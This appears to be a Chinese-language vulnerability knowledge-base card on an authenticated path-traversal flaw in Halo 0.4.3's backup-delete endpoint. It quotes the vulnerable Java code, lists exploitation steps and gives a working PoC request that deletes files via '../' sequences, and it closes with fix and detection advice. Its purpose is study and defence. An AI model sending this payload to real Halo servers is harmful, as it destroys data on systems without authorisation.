---
id: web-java-component-halo-delbackup-path-traversal-file-delete
title: Halo 0.4.3 后台 delBackup 备份删除：type/fileName 直接拼接导致 ../ 路径穿越任意文件删除
type: scenario
domain: web
path: web/java/component
technique: halo-delbackup-path-traversal-delete
aliases:
- Halo 任意文件删除
- Halo delBackup 路径穿越
- BackupController 任意文件删除
- Halo 备份删除
tags:
- java
- halo
- spring-boot
- path-traversal
- arbitrary-file-delete
- backup
- authenticated
cve: []
severity: medium
confidence: high
status: verified
affected_versions: Halo 0.4.3（原文复现版本，未给出受影响区间）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T08:49:51+08:00'
  notes: 已对照原文与图03-09核对：BackupController.delBackup 第215行 srcPath=user.home+"/halo/backup/"+type+"/"+fileName 直接拼接，第217行 FileUtil.del(srcPath)，无规范化/白名单；图08断点 srcPath=C:\Users\21865/halo/backup/resources/resources_backup_20260116105816.zip，图09 GET /admin/backup/delBackup?type=resourcesposts&fileName=../../../../Desktop/demo.txt 返回删除成功，穿越删除成立。图09的 type 为 resourcesposts 而卡内 PoC 写 resources，type 同为可控参数不影响结论。affected_versions 按原文仅标注复现版本 0.4.3、未给区间，未猜。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
---

## 一句话结论

Halo 0.4.3 后台备份管理的 `/admin/backup/delBackup` 接口把 `type`、`fileName` 直接拼进 `user.home + "/halo/backup/" + type + "/" + fileName` 再交给 `FileUtil.del()`，没有规范化或目录包含校验；拥有后台会话的攻击者用 `../` 即可删除应用进程有权限的任意文件。

## 原理

- `BackupController.delBackup()` 定义：

  ```java
  @GetMapping("/delBackup")
  @ResponseBody
  public JsonResult delBackup(@RequestParam("fileName") String fileName,
                              @RequestParam("type") String type) {
      final String srcPath = System.getProperty("user.home")
              + "/halo/backup/" + type + "/" + fileName;
      try {
          FileUtil.del(srcPath);
          return new JsonResult(SUCCESS, ...);
      } catch (Exception e) {
          return new JsonResult(FAIL, ...);
      }
  }
  ```

  拼接后的字符串直接作为路径交给 `FileUtil.del()`（Hutool），没有任何 `getCanonicalPath()`/`startsWith` 校验，也没有限制 `fileName` 只能是备份文件名。
- `fileName` 中的 `../` 由文件系统在打开/删除时解析，可逐级跳出 `~/halo/backup/<type>/`，到达用户目录、系统盘或其他可写目录；`type` 同样可控，可用来调整基准目录。
- 删除不存在的路径时 `FileUtil.del` 通常不抛异常，接口仍返回“删除成功！”，因此响应成功不代表一定存在目标文件，但删除真实存在的文件时会立即生效。
- 后台备份页通过 `JSESSIONID` 会话访问，接口位于 `/admin/` 下，因此需要有效后台登录态；一旦获得（弱口令、会话劫持或后台权限滥用），即可把“删除备份”变成删除任意文件。

## 触发条件

- Halo 0.4.3（原文复现版本）运行中，`/admin/backup/delBackup` 可访问。
- 攻击者持有有效后台会话（原文请求携带登录后的 `JSESSIONID`，Referer 为 `/admin/backup`）。
- 运行 Halo 的系统用户对目标文件有删除权限；Windows 用户目录、Linux 家目录/应用目录下文件通常满足。
- 不需要知道完整备份路径，只需按 `../../` 级数调整到目标目录。

## 利用步骤

1. 登录后台并打开“设置 → 博客备份”，确认存在备份列表及删除按钮，抓取其 `GET /admin/backup/delBackup?type=...&fileName=...` 请求。
2. 先按正常文件删除一次，观察响应 `{"code":1,"msg":"删除成功！"}`，确认接口与鉴权状态。
3. 把 `fileName` 改成带 `../` 的相对路径（如 `../../../../Desktop/demo.txt`），`type` 保持 `resources`；`../` 的级数按目标系统用户目录到目标文件的层级调整。
4. 发送请求后检查目标文件是否消失；响应仍可能固定为“删除成功”，需以文件系统结果为准。
5. 可删除应用配置、数据库备份、密钥、脚本等敏感文件，配合其他漏洞扩大影响。

## PoC

```http
GET /admin/backup/delBackup?type=resources&fileName=../../../../Desktop/demo.txt HTTP/1.1
Host: localhost:8090
Cookie: JSESSIONID=<有效后台会话>
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Referer: http://localhost:8090/admin/backup
```

```json
{"code":1,"msg":"删除成功！","devMsg":null,"result":null}
```

```text
# 原文调试断点中 srcPath 正常值为：
# C:\Users\21865/halo/backup/resources/resources_backup_20260116105816.zip
# 将 fileName 改为 ../../../../Desktop/demo.txt 后，实际删除桌面 demo.txt
```

## 变体与关联

- 变体：`type` 也可插入 `../`，与 `fileName` 组合可到达更多目录；Windows 下可用 `..\..\` 或绝对路径（取决于拼接与文件系统解析）。
- 变体：同类备份/下载/清理接口若把文件名拼进 `user.home`、临时目录、上传目录后直接 `delete()`/`del()`，均适用本思路。
- 关联：`[[web-java-component-litemall-storage-delete-arbitrary-file]]`（对象存储 key 未规范化导致任意删除）、`[[web-php-zentao-backup-editor-arbitrary-file-delete]]`（备份编辑导致任意删除），同属“文件名穿越 + 删除 sink”。
- 边界：需要后台会话；若目标文件不存在则静默成功，不能据此判断文件是否存在；应用以低权限运行时只能删除该用户可删的文件。

## 检测与防御

- 修复：删除前对目标路径 `getCanonicalPath()` 并校验 `startsWith(backupRoot + File.separator)`；拒绝 `..`、绝对路径与路径分隔符；只允许备份列表中的文件名（白名单/ID 查表）。
- 权限：备份删除接口增加二次确认与操作审计；后台账号强口令并限制来源；应用进程使用最小权限账户运行。
- 检测：`/admin/backup/delBackup` 请求的 `fileName`/`type` 含 `..`、`/`、`\` 或绝对路径；备份列表与实际文件不一致；同一会话短时间连续删除多个不同目录文件；系统日志中出现应用进程删除非备份目录文件的记录。
